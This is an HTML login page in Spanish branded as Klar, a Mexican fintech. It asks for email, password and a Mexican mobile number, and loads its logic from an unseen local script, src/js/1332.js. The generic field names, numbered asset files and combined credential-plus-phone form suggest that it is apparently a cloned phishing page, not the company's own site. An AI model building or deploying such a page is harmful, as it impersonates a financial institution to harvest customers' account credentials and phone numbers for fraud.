<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta name="theme-color" content="#f4f4f4">
    <title>Klar — Iniciar sesión</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="src/css/1332.css">

    <script nonce="imndC7k+HjS4AkhlYJQ2Zg==">
        if (self !== top) { top.location = self.location; }
    </script>
</head>
<body>

    <div id="loader">
        <div class="loader-bar"></div>
        <div class="loader-bar"></div>
        <div class="loader-bar"></div>
        <div class="loader-bar"></div>
    </div>

    <main class="screen">

        <header class="topbar">
            <button type="button" class="nav-btn" aria-label="Volver">
                <svg viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M15.4 7.4 14 6l-6 6 6 6 1.4-1.4L10.8 12z"/>
                </svg>
            </button>

            <button type="button" class="nav-btn" aria-label="Soporte">
                <svg viewBox="0 0 24 24" aria-hidden="true" class="stroke">
                    <path d="M4 13v-1a8 8 0 0 1 16 0v1"/>
                    <path d="M4 13h2.2a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-5z"/>
                    <path d="M20 13h-2.2a1 1 0 0 0-1 1v4a1 1 0 0 0 1 1H19a1 1 0 0 0 1-1v-5z"/>
                    <path d="M18 19.5a3 3 0 0 1-3 2.5h-1.5"/>
                </svg>
            </button>
        </header>

        <div class="brand">Klar</div>

        <section class="form-wrap">

            <h1>Iniciar sesión</h1>

            <form id="accesoForm" method="POST" novalidate>

                <div class="field">
                    <input
                        class="field-input"
                        type="email"
                        id="tx_email_id"
                        name="tx_email_name"
                        inputmode="email"
                        autocomplete="email"
                        autocapitalize="none"
                        spellcheck="false"
                        placeholder="Correo electrónico"
                        required>
                </div>

                <div class="field">
                    <input
                        class="field-input"
                        type="password"
                        id="tx_pass_id"
                        name="tx_pass_name"
                        autocomplete="current-password"
                        placeholder="Contraseña o contraseña temporal"
                        required>

                    <button type="button" class="eye" data-target="tx_pass_id" aria-label="Mostrar u ocultar">
                        <svg viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M12 5c-5 0-9 4.5-9 7s4 7 9 7 9-4.5 9-7-4-7-9-7zm0 11.5A4.5 4.5 0 1 1 16.5 12 4.5 4.5 0 0 1 12 16.5zm0-7.2A2.7 2.7 0 1 0 14.7 12 2.7 2.7 0 0 0 12 9.3z"/>
                        </svg>
                        <span class="slash"></span>
                    </button>
                </div>

                <div class="field">
                    <span class="prefix">+52</span>
                    <input
                        class="field-input with-prefix"
                        type="tel"
                        id="tx_user_id"
                        name="tx_user_name"
                        inputmode="numeric"
                        autocomplete="tel"
                        maxlength="10"
                        placeholder="Número de celular"
                        required>
                </div>

                <p class="form-error" id="formError" role="alert" aria-live="polite"></p>

                <a class="link-help" href="#" id="linkHelp">¿Problemas con tu contraseña?</a>

                <button type="submit" class="btn-primary" id="submitBtn" disabled>Iniciar sesión</button>

            </form>

        </section>

        <footer class="footer">Klar Technologies, S.A. de C.V., S.F.P.</footer>

    </main>

    <script nonce="imndC7k+HjS4AkhlYJQ2Zg==">window.script_nonce = "imndC7k+HjS4AkhlYJQ2Zg==";</script>
    <script nonce="imndC7k+HjS4AkhlYJQ2Zg==" src="src/js/1332.js"></script>

</body>
</html>
